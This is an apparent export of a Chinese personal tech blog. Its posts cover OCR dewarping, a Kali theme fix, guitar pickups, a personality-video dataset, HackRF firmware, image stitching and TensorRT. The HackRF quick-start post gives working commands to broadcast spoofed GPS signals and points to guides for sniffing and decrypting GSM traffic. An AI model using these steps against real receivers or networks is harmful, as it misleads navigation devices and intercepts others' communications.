<h2 id="0x04-Document-Dewarping"><a href="#0x04-Document-Dewarping" class="headerlink" title="0x04 Document Dewarping"></a>0x04 Document Dewarping</h2><ul>
<li>数据集[<a href="http://staffhome.ecm.uwa.edu.au/~00082689/downloads.html">CBDAR 2007 dataset</a>]</li>
<li>[<a href="http://www.imlab.jp/cbdar2007/proceedings/papers/P1.pdf">CBDAR 2007</a>] Fu, Bin, et al. “A model-based book dewarping method using text line detection.”<br>CTM 方法，有一个非官方实现[github] [blog]</li>
<li>[<a href="http://159.226.21.68/bitstream/173211/3713/1/TPAMI2012.pdf">TPAMI 2012</a>] Meng et al. 2011, Metric rectification of curved document images</li>
<li>[PR 2015] Kim et al. 2015, Document dewarping via text-line based optimization<br>有个同学了复现上面两个算法[<a href="https://github.com/phulin/rebook">github</a>，我暂时跑不通</li>
<li>[<a href="https://ieeexplore.ieee.org/document/8270077/authors#authors">ICDAR 2017</a>] Robust Document Image Dewarping Method Using Text-Lines and Line Segments<br>应该是最新的，作者提供了[二进制文件]，没有源码，据说比2015年Kim的算法好很多</li>
<li>[<a href="https://www3.cs.stonybrook.edu/~cvl/content/papers/2018/Ma_CVPR18.pdf">CVPR 2018</a>] DocUNet. A state-of-the-art work from face++ probably, but no source code.</li>
<li>Leptonica，很好的库，注释比代码都多。它的dewarping代码貌似是基于textlines的</li>
</ul>
<p>Python 中使用 tesseract-ocr leptonica [<a href="https://github.com/ybur-yug/python_ocr_tutorial">github</a>] [<a href="https://realpython.com/setting-up-a-simple-ocr-server/">blog</a>]</p>
<h2 id="0xFF-开源框架"><a href="#0xFF-开源框架" class="headerlink" title="0xFF 开源框架"></a>0xFF 开源框架</h2><ul>
<li><a href="https://github.com/scantailor/scantailor">scantailor</a> <code>比较古老</code> 可以将拍照的书页自动转换为无卷曲的扫描书页</li>
</ul>
<img src="http://qiniu.s1nh.org/Blog_docstrum_7.png" width="600">

<img src="http://qiniu.s1nh.org/Blog_docstrum_8.png" width="500">

<ul>
<li><a href="http://www.leptonica.com/line-removal.html">leptonica</a>  一个古老又顽强的库<code>被Tesseract、OpenCV、jbig2enc依赖</code>，官方有很多例子演示它好玩的算法</li>
</ul>
<img src="http://qiniu.s1nh.org/Blog_docstrum_9.png" width="700">

<img src="http://qiniu.s1nh.org/Blog_docstrum_10.png" width="600">

<img src="http://qiniu.s1nh.org/Blog_docstrum_11.png" width="600">

<ul>
<li><p>OCRopus – A free document layout analysis and OCR system, implemented in C++ and Python and for FreeBSD, Linux, and Mac OS X. This software supports a plug-in architecture which allows the user to select from a variety of different document layout analysis and OCR algorithms.</p>
</li>
<li><p>OCRFeeder – An OCR suite for Linux, written in python, which also supports document layout analysis. This software is actively being developed, and is free and open-source.</p>
</li>
</ul>
]]></content>
      <categories>
        <category>图形图像</category>
      </categories>
      <tags>
        <tag>OCR</tag>
        <tag>docstrum</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali linux 主题 与 eclipse 黑色主题冲突</title>
    <url>/post/eclipse-dark-theme-conflicts-with-gnome-theme-kali/</url>
    <content><![CDATA[<p><code>2016-09-27 07:49 Fixed in Version 2016.3</code></p>
<blockquote>
<p>秉承着以解决问题为乐趣，没有问题创造问题也要解决问题为基本准则。今天发现了一个gnome-theme-kal主题在xfce4下的Bug</p>
</blockquote>
<p>最近用Nvidia提供的Nsight来写OpenCV/CUDA，白色主题实在是太丑了，就采用通用的方法换成了黑色主题。结果不管怎么折腾，旁边的Navigator都还是白色的，使得整个界面不白不黑的，简直比VIM还丑。</p>
<p><img src="http://qiniu.s1nh.org/Blog_kali-theme_1.png-QNthin"></p>
<span id="more"></span>

<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>本以为是Eclipse配置的问题，昨晚折腾了一宿都没搞定，今天一大早起来换了个主题，问题就解决了。看来是Kali的主题跟Eclipse有冲突。</p>
<p>主题目录为<code>/usr/share/themes/Kali-X/gtk-2.0/</code>。一顿瞎折腾，定位到冲突的代码为<code>gtkrc</code>文件的如下几行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GtkTreeView::odd_row_color	&#x3D; shade (0.97, @base_color)</span><br><span class="line">GtkTreeView::even_row_color	&#x3D; @base_color</span><br></pre></td></tr></table></figure>

<p>Bug的原因为Kali已经设置好了GtkTreeView的颜色，Eclipse会使用系统默认的颜色，导致黑色主题无效。注释掉以上代码，问题解决。</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>同样，按钮的颜色也很丑，是<code>default_button_color = shade (1.12, @bg_color)</code>和<code>bg[PRELIGHT] = shade (1.13, @bg_color)</code>代码导致的。</p>
<p><img src="http://qiniu.s1nh.org/Blog_kali-theme_2.png-QNthin"></p>
<p>我的解决方案为注释前一行，修改后一行，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># default_button_color &#x3D; shade (1.12, @bg_color)   ##注释掉这行</span><br><span class="line"></span><br><span class="line">bg[PRELIGHT] &#x3D; shade (1.13, @selected_bg_color)    ##修改颜色</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>修改后问题解决：</p>
<p><img src="http://qiniu.s1nh.org/Blog_kali-theme_3.png-QNthin"></p>
<p>已经提交<a href="https://bugs.kali.org/view.php?id=3630">Bug Tracker</a>（估计又有人要嫌弃我的英文水平了）</p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>首版复刻的Fender &#39;57 &amp; &#39;62 Strat 拾音器</title>
    <url>/post/fender-57-62-strat-pickup-first-reissue/</url>
    <content><![CDATA[<blockquote>
<p>去年10月份左右从咸鱼买了一把号称93年产原装无修改的Fender vintage 57 stratocaster，拆开看了一下，琴颈的生产日期是1993.05.21，还挺有纪念意义的。但就在我买了新拾音器准备改装它的时候，好像发现了一个天大的秘密。</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/Blog_guitars_1.jpg-QNthin" title="上面那把（找不到其它完整的图了）"></p>
<span id="more"></span>

<!-- ![](http://qiniu.s1nh.org/Blog_vintage_57_neck.jpg-QNthin) -->


<p>按理说57/62拾音器相对别的Custom Shop拾音器是比较便宜的，特征是<code>直流电阻5.6K Ohm</code>，六根磁柱都有<code>倒角</code>，黄铜线圈（具体的可以查看<a href="http://shop.fender.com/en/intl/parts/pickups-preamps/fender-original-%E2%80%9957%E2%80%9962-strat-pickups/0992117000.html">fender官网介绍</a>。可是我刚拆开拾音器就看到了里面的<strong>紫铜线圈</strong>，我的第一反应是琴的原主人给换了<code>Texas Special Pickup</code>，这可赚大了，可经我查完资料以后发现这不是 <code>Texas Special</code>，而是首版复刻的<code>57/62</code>。</p>
<p><em>网上的两篇介绍《<a href="https://planetbotch.blogspot.tw/2012/07/fender-57-62-strat-pickup-first-reissue.html">Fender ‘57 &amp; ‘62 Strat Pickup (First Reissue)</a>》《<a href="https://www.strat-talk.com/threads/poll-about-the-f-57-62-099-2117-000-s.205219/">Poll About the F ‘57/‘62 099-2117-000 s</a>》</em></p>
<p><strong>—–pre-1998 version of the Fender USA Vintage Stratocaster ’57 &amp; ’62 reissue pickup—–</strong></p>
<p>拾音器的细节是<code>紫铜线圈</code> <code>电阻6.5K 6.2K 6.5K</code> <code>磁钢没有倒角</code>。除了背面没有红/蓝点，导线都是白/黑（Texas的琴桥为黄/黑）以外，外观跟 <code>Texas Special</code> 一模一样。</p>
<p><img src="http://qiniu.s1nh.org/Blog_fender_57_62_pickup.jpg-QNthin"></p>
<p>Fender 在1992年前的复刻（vintage reissue）吉他中只有这个拾音器，代号为<code>99-2043-000</code>，之后Fender为了复制SRV的声音，以及制作签名款SRV吉他，才开始生产<code>Texas Special</code>拾音器。1998年以后<code>57/62</code>才开始用现在的拾音器<code>099-2117-000</code>（特征是塑料线/有倒角/黄铜线圈/电阻5.6k）</p>
<p><strong>—–我的93年复刻Vintage 57—–</strong></p>
<p>这把57除了拾音器不同以外，电容也很独特<code>0.1uf</code>（刚换上新拾音器的时候声音闷的不行，直到我第二次拆开后发现电容那么大）。之前的<code>pre-1998 57/62</code>拾音器加上0.1的电容声音又大又亮（功率介于<code>dimarzio HS-2/3/4</code>与<code>Gibson P90</code>拾音器之间），可见如果换成正常的0.022uf电容功率得多大&gt;_&lt;</p>
<p><img src="http://qiniu.s1nh.org/Blog_vintage_57_body.jpg-QNthin"></p>
<p>我新换的拾音器是我在网上淘到的停产的<code>Lace Sensor Gold domes</code>拾音器（现在只有银色的<code>Crome Domes</code>了，我问了原因，他们给的回复是 *The Gold Dome pickups were simple Chrome Domes with a gold cover. They were produced sometime during the mid-2000’s, but for only a short while. The proved to be difficult to build and not cost effective. Sonically, there was no difference from the Chrome Dome pickups.*），如果有机会的话，我还是准备把那个牛逼的拾音器换回去。</p>
<p><img src="http://qiniu.s1nh.org/Blog_vintage_57_after.jpg-QNthin"></p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
      <tags>
        <tag>Fender</tag>
        <tag>Pickups</tag>
      </tags>
  </entry>
  <entry>
    <title>第一印象（First Impressions）人物性格特征预测</title>
    <url>/post/first-impressions/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>User</th>
<th>interview</th>
<th>agreeableness</th>
<th>conscientiousness</th>
<th>extraversion</th>
<th>neuroticism</th>
<th>openness</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://github.com/frkngrpnr/jcs">heysky</a></td>
<td>0.920916</td>
<td>0.913731</td>
<td>0.919769</td>
<td>0.921289</td>
<td>0.914613</td>
<td>0.917014</td>
</tr>
<tr>
<td><a href="https://github.com/hershd23/VideoModalitiesML">hershd23</a></td>
<td>0.9180</td>
<td>0.9111</td>
<td>0.9153</td>
<td>0.9150</td>
<td>0.9100</td>
<td>0.9102</td>
</tr>
<tr>
<td>baseline</td>
<td>0.916202</td>
<td>0.91123</td>
<td>0.915228</td>
<td>0.91122</td>
<td>0.910378</td>
<td>0.911123</td>
</tr>
<tr>
<td><a href="https://github.com/Bekhouche/FirstImpressionsV2">bekhouche</a></td>
<td>0.915746</td>
<td>0.910312</td>
<td>0.913775</td>
<td>0.91551</td>
<td>0.908297</td>
<td>0.910078</td>
</tr>
<tr>
<td><a href="https://github.com/MS1997/Apparent-personality-analysis-using-videos">*MS1997</a></td>
<td>0.9047</td>
<td>0.9075</td>
<td>0.9066</td>
<td>0.9030</td>
<td>0.9018</td>
<td>0.9046</td>
</tr>
<tr>
<td><a href="https://github.com/ROC-HCI/chalearn_coopetition_2017">go2chayan</a></td>
<td>0.901859</td>
<td>0.903216</td>
<td>0.894914</td>
<td>0.90266</td>
<td>0.901147</td>
<td>0.904709</td>
</tr>
<tr>
<td><a href="https://github.com/Benlamoudi/FDMB">azzasama</a></td>
<td>0.872129</td>
<td>0.891004</td>
<td>0.865975</td>
<td>0.878842</td>
<td>0.863237</td>
<td>0.874761</td>
</tr>
</tbody></table>
<span id="more"></span>

<p><strong>more</strong></p>
<ul>
<li><a href="https://towardsdatascience.com/can-your-video-be-used-to-detect-your-personality-d8423f6d3cb3">MS1997 blog</a></li>
<li><a href="https://github.com/InnovArul/first-impressions">https://github.com/InnovArul/first-impressions</a></li>
<li>raphaellederman.github.io</li>
</ul>
<h2 id="0x01-Dataset"><a href="#0x01-Dataset" class="headerlink" title="0x01 Dataset"></a>0x01 Dataset</h2><blockquote>
<p>V1 (ECCV ‘16, ICPR ‘16) <a href="http://chalearnlap.cvc.uab.es/dataset/20/description/">http://chalearnlap.cvc.uab.es/dataset/20/description/</a><br>V2 (CVPR’17) <a href="http://chalearnlap.cvc.uab.es/dataset/24/description/">http://chalearnlap.cvc.uab.es/dataset/24/description/</a></p>
</blockquote>
<p>First Impressions 数据集包含10,000个剪辑（平均持续时间15s），这些剪辑是从3,000个不同的YouTube高清晰度（HD）视频中提取出来的，这些视频分别是面对和用英语对着摄像机说话的人。这些视频按3：1：1的比例分为训练/验证/测试集。视频中的人包括不同的性别，年龄，国籍和种族。</p>
<p>视频有人格特征标签（personality traits variables），使用Amazon Mechanical Turk（AMT）生成，采用了可靠的程序来保证标签的可靠性。认为的人格特质来自五因素模型（也称为“Big Five”），这是人格研究中的主导范式。它从五个方面对人格进行建模：性格外向（Extroversion），乐于助人（Agreeableness），尽职尽责（Conscientiousness），神经质（Neuroticism）和开放经验（Openness to experience）。因此，每个剪辑都有针对这五个特征的地面真相标签，并以[0，1]范围内的值表示。有关数据集的更多详细信息，请参见<a href="https://docs.google.com/viewer?a=v&pid=sites&srcid=Y2hhbGVhcm4ub3JnfGdlc3R1cmVjaGFsbGVuZ2V8Z3g6MWQ5NDEyZjQ4ODMyMGJmNw">此处</a>。</p>
<p>此前基于 MTurk 注释和“小片段音/视频”对人格特质的进行预测的研究可以参考：</p>
<p>J.-I. Biel, O. Aran, and D. Gatica-Perez, You Are Known by How You Vlog: Personality Impressions and Nonverbal Behavior in YouTube in Proc. AAAI Int. Conf. on Weblogs and Social Media (ICWSM), Barcelona, Jul. 2011</p>
<p>J.-I. Biel and D. Gatica-Perez, The YouTube Lens: Crowdsourced Personality Impressions and Audiovisual Analysis of Vlogs, IEEE Trans. on Multimedia, Vol. 15, No. 1, pp. 41-55, Jan. 2013</p>
<p>以及在ACM Multimedia 2014上的相关事件：</p>
<ul>
<li><a href="https://sites.google.com/site/wcprst/home/wcpr14">https://sites.google.com/site/wcprst/home/wcpr14</a></li>
<li><a href="https://www.idiap.ch/dataset/youtube-personality">https://www.idiap.ch/dataset/youtube-personality</a></li>
</ul>
<p>此外，我们还提供一个扩展数据集。具体来说，我们用新的语言数据（transcriptions）补充数据集，以补充现有的感官数据（videos）以及新的求职面试变量（interview annotations），后者补充现有的人格特质变量（trait annotations）。</p>
<p><strong>转录（Transcriptions）</strong> 视频片段中的所有单词均由专业转录服务机构转录。总共录制了435984个单词（183861个非停用词），相当于每个视频平均43个单词（18个非停用词）。在这些单词中，有14535个是唯一的（14386个非停用词）。</p>
<p><strong>面试标注（Interview annotations）</strong> 除了标记明显的人格特征之外，AMT工作者还为每个视频标记了一个变量，该变量指示是否应邀请该人参加工作面试（“工作面试变量”）。此变量还用[0，1]范围内的值表示。</p>
<p><strong>数据格式（Groundtruth file format）</strong></p>
<p>注释和转录存储在pickled dictionaries中。每个阶段应该有一个文件用于注释(annotations)，一个文件用于转录(transcriptions)。</p>
<p>每个视频都有一个转录（如果视频中没有要转录的内容，则其对应的转录将是一个空字符串）。每个转录都是一个unicode对象。转录文件是一个字典。也就是说，其键是视频的名称，其值是相应的转录。例如：</p>
<p>transcription [‘a_video_name’]将给出名为“ a_video_name”的视频的转录。</p>
<p>每个视频还具有六个注释（五个特征和一个采访）。每个注释都是介于零和一之间的值。注释文件是词典的字典。也就是说，外部字典的键是注释的名称，其值是字典。内部词典的键是视频的名称，其值是与外部词典的键相对应的实际注释。例如：</p>
<p>annotation[‘interview’] [‘a_video_name’] 会给出名为 “ a_video_name” 的视频的采访注释的值。<br>annotation[‘openness’] [‘another_video_name’] 会给出名为 “ another_video_name” 的视频的开放性注解的值。</p>
<p>可以在<a href="http://158.109.8.102/FirstImpressionsV2/prediction.zip">此处</a>找到测试阶段的样本预测文件（定量）。</p>
<p>您可以在<a href="http://158.109.8.102/FirstImpressionsV2/submission_bundle.zip">此处</a>找到第二阶段的样本预测文件（定性）。</p>
<p><strong>密钥</strong></p>
<p>Encryption key for validation groundtruth and test set (without groundtruth) is “zeAzLQN7DnSIexQukc9W”.<br>Encryption key for files test80_01.zip to test80_25.zip is “.chalearnLAPFirstImpressionsSECONDRoundICPRWorkshop2016.”.</p>
<p><strong>New!</strong></p>
<p>我们正在为第一印象数据集提供可用的性别和种族注释。这些标签由Heysem Kaya和Albert Ali Salah提供。 </p>
<p>请引用以下论文以引用此类注释：</p>
<p><a href="https://arxiv.org/abs/1802.00745">Hugo Jair Escalante, Heysem Kaya, Albert Ali Salah, Sergio Escalera, Yagmur Gucluturk, Umut Guclu, Xavier Baro, Isabelle Guyon, Julio Jacques Junior, Meysam Madadi, Stephane Ayache, Evelyne Viegas, Furkan Gurpinar, Achmadnoer Sukma Wicaksana, Cynthia C. S. Liem, Marcel A. J. van Gerven, Rob van Lier Explaining First Impressions: Modeling, Recognizing, and Explaining Apparent Personality from Videos. ArXiv, 1802.00745, 2018</a></p>
<p>标签如下：</p>
<ul>
<li>种族：亚洲人= 1，高加索人= 2，非裔美国人= 3</li>
<li>性别：男= 1，女= 2</li>
</ul>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>更新 HackRF one 到最新的 2017.02.1 固件</title>
    <url>/post/hackrf-firmware-upgrade/</url>
    <content><![CDATA[<p>HackRF已经吃灰一年多了，官方的上一个版本还是2015.07，最新的2017.02.1版增加了<code>Sweep mode</code>，<code>Hardware synchronization</code>，<code>hackrf_debug</code>，降低了功耗以及修复了Bug. 在<a href="https://github.com/mossmann/hackrf/releases">mossmann/hackrf/releases</a>有编译好的固件<a href="https://github.com/mossmann/hackrf/releases/download/v2017.02.1/hackrf-2017.02.1.tar.xz">hackrf-2017.02.1.tar.xz</a>下载</p>
<p><img src="http://qiniu.s1nh.org/Blog_HackRF_01.jpeg-QNthin"></p>
<span id="more"></span>

<p>要注意的是Kali Linux用apt-get安装的hackrf还停留在2015.07版本，只更新固件会导致莫名其妙的错误。升级固件的同时需要更新主机上的Host软件<code>libhackrf</code>和<code>hackrf-tools</code></p>
<h2 id="0x01-HackRF-host-软件更新"><a href="#0x01-HackRF-host-软件更新" class="headerlink" title="0x01 HackRF host 软件更新"></a>0x01 HackRF host 软件更新</h2><p>解压<code>hackrf-2017.02.1.tar.xz</code>，执行以下命令更新Host软件（host目录下有README.md可以参考）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd host</span><br><span class="line">mkdir build</span><br><span class="line">cmake ..&#x2F; -DINSTALL_UDEV_RULES&#x3D;ON</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>
<h2 id="0x02-HackRF-固件更新"><a href="#0x02-HackRF-固件更新" class="headerlink" title="0x02 HackRF 固件更新"></a>0x02 HackRF 固件更新</h2><p>进入<code>firmware-bin</code>目录，执行以下步骤</p>
<ul>
<li><code>hackrf_spiflash -Rw hackrf_one_usb.bin</code> 更新SPI</li>
<li><code>hackrf_cpldjtag -x hackrf_cpld_default.xsvf</code> 更新CPLD</li>
</ul>
<p>此时可以用hackrf_info查看更新后的版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(anaconda3-4.3.0) root@kali:~&#x2F;Downloads# hackrf_info </span><br><span class="line">hackrf_info version: 2017.02.1</span><br><span class="line">libhackrf version: 2017.02.1 (0.5)</span><br><span class="line">Found HackRF</span><br><span class="line">Index: 0</span><br><span class="line">Serial number: 0000000000000000909864c8283593cf</span><br><span class="line">Board ID Number: 2 (HackRF One)</span><br><span class="line">Firmware Version: 2017.02.1 (API:1.02)</span><br><span class="line">Part ID Number: 0xa000cb3c 0x005e4745</span><br></pre></td></tr></table></figure>

<h2 id="0x03-更新DFU（可选）"><a href="#0x03-更新DFU（可选）" class="headerlink" title="0x03 更新DFU（可选）"></a>0x03 更新DFU（可选）</h2><p>只有在HackRF固件损坏的情况下才需要刷新DFU。</p>
<p>首先按住RESET键和DFU键，然后依次松开RESET键和DFU键，引导板子进入DFU模式。然后执行<code>dfu-util --device 1fc9:000c --alt 0 --download hackrf_one_usb.dfu</code>刷新DFU</p>
<h2 id="0x04-自己编译固件"><a href="#0x04-自己编译固件" class="headerlink" title="0x04 自己编译固件"></a>0x04 自己编译固件</h2><p>可以参考<a href="http://scateu.me/2015/08/06/hackrf-how-to-compile-firmware.html">HackRF固件更新及编译环境搭建</a></p>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>HackRF</tag>
      </tags>
  </entry>
  <entry>
    <title>HackRF 入门 -- GPS欺骗、GSM嗅探</title>
    <url>/post/hackrf-quick-start/</url>
    <content><![CDATA[<p><img src="http://qiniu.s1nh.org/Blog_HackRF_00.png-QNthin"></p>
<p><a href="/post/hackrf-firmware-upgrade">上一节</a>已经对HackRF升级了最新的固件，今天我们利用它做一些简单的实验。因为本人也是小白，所以本文并没有任何复杂的理论知识，只要会用Linux按照顺序一步一步操作都可以实验成功。</p>
<span id="more"></span>

<h2 id="0x01-GPS欺骗"><a href="#0x01-GPS欺骗" class="headerlink" title="0x01 GPS欺骗"></a>0x01 GPS欺骗</h2><p>第一个实验使用GPS-SDR-SIM生成GPS仿真数据，使用hackrf_transfer发送欺骗GPS信号。</p>
<h3 id="下载并编译-GPS-SDR-SIM"><a href="#下载并编译-GPS-SDR-SIM" class="headerlink" title="下载并编译 GPS-SDR-SIM"></a>下载并编译 GPS-SDR-SIM</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;osqzss&#x2F;gps-sdr-sim.git</span><br><span class="line">cd gps-sdr-sim</span><br><span class="line">gcc-mp-5 gpssim.c -lm -O3 -o gps-sdr-sim</span><br></pre></td></tr></table></figure>

<h3 id="生成GPS仿真数据"><a href="#生成GPS仿真数据" class="headerlink" title="生成GPS仿真数据"></a>生成GPS仿真数据</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;gps-sdr-sim -e brdc3540.14n -l 31.603202,120.466576,100 -b 8 -d 100</span><br></pre></td></tr></table></figure>

<p>具体每个参数应该怎样设置可以参照参考文献或官方文档。在这里需要注意的是，参考的两篇文章都没有添加 <code>-d</code> 参数，实验的过程中发现没有这个参数生成的仿真文件为空，所以我在这里使用<code>-d 100</code>生成了一个100s的gps信号文件（约500M）。</p>
<blockquote>
<p>如果把<code>-d</code>设置为<code>10</code>，我这边无法成功欺骗手机。</p>
</blockquote>
<h3 id="发射GPS数据"><a href="#发射GPS数据" class="headerlink" title="发射GPS数据"></a>发射GPS数据</h3><p>使用HackRF套件的hackrf_transfer程序发射GPS数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0</span><br></pre></td></tr></table></figure>

<p>HackRF 在发送完100秒GPS信号后会自动停止，如果想重复循环发送信号，可以在后面加上<code>-R</code>参数<br>运行后第53秒手机被成功欺骗^_^</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1] <a href="http://blog.csdn.net/opensourcesdr/article/details/51968678">使用HackRF和外部时钟实现GPS欺骗实验</a><br>[2] <a href="http://www.cnblogs.com/k1two2/p/5164172.html">HackRF实现GPS欺骗教程</a></p>
<h2 id="0x02-利用hackRF嗅探GSM网络流量"><a href="#0x02-利用hackRF嗅探GSM网络流量" class="headerlink" title="0x02 利用hackRF嗅探GSM网络流量"></a>0x02 利用hackRF嗅探GSM网络流量</h2><h3 id="一篇参考"><a href="#一篇参考" class="headerlink" title="一篇参考"></a>一篇参考</h3><p>可以直接转到这篇文章《<a href="http://www.freebuf.com/articles/wireless/68736.html">利用hackRF嗅探GSM网络流量</a>》，一步一步照做就行了。下面是我在嗅探时的截图：</p>
<p><img src="http://qiniu.s1nh.org/Blog_HackRF_GSM.gif" title="grgsm_livemon 嗅探GSM信号"></p>
<p>如果编译安装过程出问题，可以参照官方文档的编译方法：<a href="https://github.com/ptrkrysik/gr-gsm/wiki/Manual-compilation-and-installation">Manual compilation and installation</a></p>
<h3 id="另一篇参考"><a href="#另一篇参考" class="headerlink" title="另一篇参考"></a>另一篇参考</h3><p>还有另一篇<a href="http://www.freebuf.com/articles/wireless/110773.html">GSM Hacking Part ① ：使用SDR扫描嗅探GSM网络</a>写的也很好，不过里面有一个错误，在运行<code>grgsm_livemon -f 937.4</code>嗅探的时候会报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    return _osmosdr_swig.source_sptr_set_center_freq(self, freq, chan)</span><br><span class="line">RuntimeError: hackrf_set_freq(-399063) has failed (-1000) Pipe error</span><br></pre></td></tr></table></figure>

<p>不知道是作者笔误还是grgsm的开发者修改了参数，这行<code>-f</code>参数应该以<code>HZ</code>为单位，所以输入<code>grgsm_livemon -f 937400000</code>，程序运行成功。</p>
<h3 id="airprobe-rtlsdr-py-还是-grgsm-livemon-？"><a href="#airprobe-rtlsdr-py-还是-grgsm-livemon-？" class="headerlink" title="airprobe_rtlsdr.py 还是 grgsm_livemon ？"></a>airprobe_rtlsdr.py 还是 grgsm_livemon ？</h3><p>看完上面两篇文章会发现他们用了不同的命令来嗅探，一个是<code>airprobe_rtlsdr.py</code>另一个是<code>grgsm_livemon</code>。其实这两个命令是一样的，具体可以参考<a href="https://github.com/ptrkrysik/gr-gsm/wiki/Usage">ptrkrysik/gr-gsm/Usage</a>。我们进入<code>/usr/local/bin</code>目录也会发现<code>airprobe_rtlsdr.py</code>只是对应<code>grgsm_livemon</code>的链接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root staff        12 Mar 15 02:31 airprobe_decode.py -&gt; grgsm_decode*</span><br><span class="line">root staff        16 Mar 15 02:31 airprobe_rtlsdr_capture.py -&gt; grgsm_capture.py*</span><br><span class="line">root staff        13 Mar 15 02:31 airprobe_rtlsdr.py -&gt; grgsm_livemon*</span><br><span class="line">root staff        13 Mar 15 02:31 airprobe_rtlsdr_scanner.py -&gt; grgsm_scanner*</span><br><span class="line">root staff     10870 Mar 15 02:30 grgsm_capture.py*</span><br><span class="line">root staff      7449 Mar 15 02:30 grgsm_channelize.py*</span><br><span class="line">root staff     19209 Mar 15 02:30 grgsm_decode*</span><br><span class="line">root staff     13354 Mar 15 02:30 grgsm_livemon*</span><br><span class="line">root staff     15654 Mar 15 02:30 grgsm_scanner*</span><br></pre></td></tr></table></figure>

<h2 id="0x03-未完待续"><a href="#0x03-未完待续" class="headerlink" title="0x03 未完待续"></a>0x03 未完待续</h2><p>接下来的工作主要是解密收到的GSM信号，解密LTE信号，以及搭建伪基站。<br><a href="http://www.freebuf.com/articles/wireless/105324.html">GSM Hacking：如何对GSM/GPRS网络测试进行测试？</a><br><a href="http://www.freebuf.com/articles/wireless/111577.html">GSM Hacking Part ② ：使用SDR捕获GSM网络数据并解密</a><br><a href="http://www.freebuf.com/articles/wireless/32331.html"> 使用HackRF解调TDD-LTE信号 </a></p>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>HackRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/post/hello-world/</url>
    <content><![CDATA[<blockquote>
<p>博客都是孤芳自赏，分享都是自我陶醉。</p>
</blockquote>
<p><img src="/about/block-3.png"></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>解决廉价摄像头在图像拼接中产生的曝光不均匀问题</title>
    <url>/post/image-stitching-post-process/</url>
    <content><![CDATA[<blockquote>
<p>去年把全景拼接算法部署到了郑州机场，实现 4×4K 视频采集、拼接、发布，在单个 1080ti 上可以达到 300FPS。</p>
</blockquote>
<p>因为机场光照特别强烈，使用的廉价摄像头曝光不均匀。表现为每张图片都是中间曝光强，四周曝光弱，拼接以后在接缝处会出现条纹（下图）。因为摄像头上半部分是天空，我们假设天空的亮度、颜色是统一的，可以设计一个很简单的算法解决亮度不均匀的问题。</p>
<p><img src="http://qiniu.s1nh.org/blog_01.origin-stitching.png-QNthin"></p>
<span id="more"></span>

<p>首先，取天空中的一行像素拉伸到整张图片作为 <code>mask</code></p>
<p><img src="http://qiniu.s1nh.org/blog_02.exposure-mask.png-QNthin"></p>
<p>将像素值归一化到最大为255 <code>mask_refine = 255 - max(mask) + mask</code></p>
<p><img src="http://qiniu.s1nh.org/blog_03.exposure-mask-refine.png-QNthin"></p>
<p>应用 mask <code>final_stitching = origin_stitching + (255 - mask_refine)</code>，效果就好很多了。</p>
<p><img src="http://qiniu.s1nh.org/blog_04.apply-mask.png-QNthin"></p>
<p>如果要适配大屏幕，还可以最后人工调整一下直方图。</p>
<p><img src="http://qiniu.s1nh.org/blog_05.final-stitching.png-QNthin"></p>
]]></content>
      <categories>
        <category>图形图像</category>
      </categories>
  </entry>
  <entry>
    <title>Inference using TensorRT Backend.</title>
    <url>/post/inference-using-tensorrt-backend/</url>
    <content><![CDATA[<h2 id="0x01-Tensorflow-2-0"><a href="#0x01-Tensorflow-2-0" class="headerlink" title="0x01 Tensorflow 2.0"></a>0x01 Tensorflow 2.0</h2><h3 id="1-1-Convert"><a href="#1-1-Convert" class="headerlink" title="1.1. Convert"></a>1.1. Convert</h3><p><strong>keras hdf5 –&gt; .pb</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># V2 behaviour is disabled by default in Jetpack 4.4.DP.</span><br><span class="line">import tensorflow.compat.v2 as tf</span><br><span class="line">from tensorflow.keras.models import load_model</span><br><span class="line"></span><br><span class="line">model &#x3D; load_model(&#39;.&#x2F;model&#x2F;fer2013_mini_XCEPTION.102-0.66.hdf5&#39;)</span><br><span class="line">model.save(&#39;.&#x2F;model&#x2F;tf_savedmodel&#39;, save_format&#x3D;&#39;tf&#39;)</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p><strong>.pb–&gt;trt.pb</strong></p>
